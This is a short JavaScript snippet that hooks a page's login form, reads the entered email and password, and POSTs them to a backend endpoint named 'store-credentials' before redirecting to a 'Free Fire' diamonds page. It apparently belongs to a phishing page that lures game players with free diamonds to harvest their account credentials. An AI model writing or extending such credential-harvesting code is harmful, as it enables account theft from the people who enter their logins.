// Replace the existing script tag with this one

document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const email = this.querySelector('input[type="text"]').value;
    const password = this.querySelector('input[type="password"]').value;

    if (!email || !password) {
        alert('Please enter both email and password');
        return;
    }

    // Send credentials to backend
    fetch('http://localhost:5000/store-credentials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                // Redirect to Free Fire page after successful storage
                window.location.href = '../diamonds/index.html';
            } else {
                throw new Error(data.error || 'Failed to process login');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        });
});
